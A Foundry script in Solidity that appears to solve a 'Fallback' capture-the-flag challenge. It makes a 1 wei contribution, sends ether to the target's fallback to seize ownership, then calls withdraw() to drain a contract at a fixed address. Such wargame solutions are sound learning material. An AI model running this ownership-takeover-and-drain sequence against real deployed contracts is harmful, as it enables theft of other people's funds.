// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public fallbackContract = Fallback(payable(0x4318c9aEEb22Be7B0D1aA230c2671915eB827a6C));

    function run() external {
	vm.startBroadcast();

	fallbackContract.contribute{value: 1 wei}();

	(bool success, ) = address(fallbackContract).call{value: 1 wei}("");
	require(success);

	fallbackContract.withdraw();

	vm.stopBroadcast();
    }
}
